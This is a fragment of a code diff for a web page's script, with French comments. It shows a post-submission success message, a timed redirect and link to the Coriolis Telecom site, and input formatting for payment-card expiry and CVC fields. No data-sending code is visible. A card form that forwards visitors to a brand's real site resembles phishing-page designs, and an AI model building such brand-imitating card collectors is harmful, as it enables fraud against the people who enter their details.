+                            window.location.href = 'https://coriolis-telecom.fr';
+                        }
+                    }, 1000);
+                    
+                    // Option de redirection manuelle
+                    setTimeout(() => {
+                        const manualRedirect = document.createElement('div');
+                        manualRedirect.style.cssText = 'text-align: center; margin-top: 20px;';
+                        manualRedirect.innerHTML = `
+                            <a href="https://coriolis-telecom.fr" target="_blank" style="
+                                display: inline-block;
+                                background: var(--primary-blue);
+                                color: white;
+                                padding: 10px 20px;
+                                border-radius: 8px;
+                                text-decoration: none;
+                                font-weight: 600;
+                                font-size: 14px;
+                            ">
+                                <i class="fas fa-external-link-alt" style="margin-right: 8px;"></i>
+                                Accéder au site Coriolis Telecom maintenant
+                            </a>
+                        `;
+                        successDiv.appendChild(manualRedirect);
+                    }, 2000);
+                    
+                }, 2000);
+            }
         });
 
         // Formatage date d'expiration
-        const expiryInput = document.getElementById('expiry-date');
-        expiryInput.addEventListener('input', function(e) {
+        document.getElementById('expiry-date').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
             if (value.length >= 2) value = value.substring(0, 2) + '/' + value.substring(2, 4);
             e.target.value = value;
         });
 
         // CVC uniquement numérique
-        const cvcInput = document.getElementById('cvc');
-        cvcInput.addEventListener('input', function(e) {
+        document.getElementById('cvc').addEventListener('input', function(e) {
             e.target.value = e.target.value.replace(/[^0-9]/gi, '');
         });
     </script>
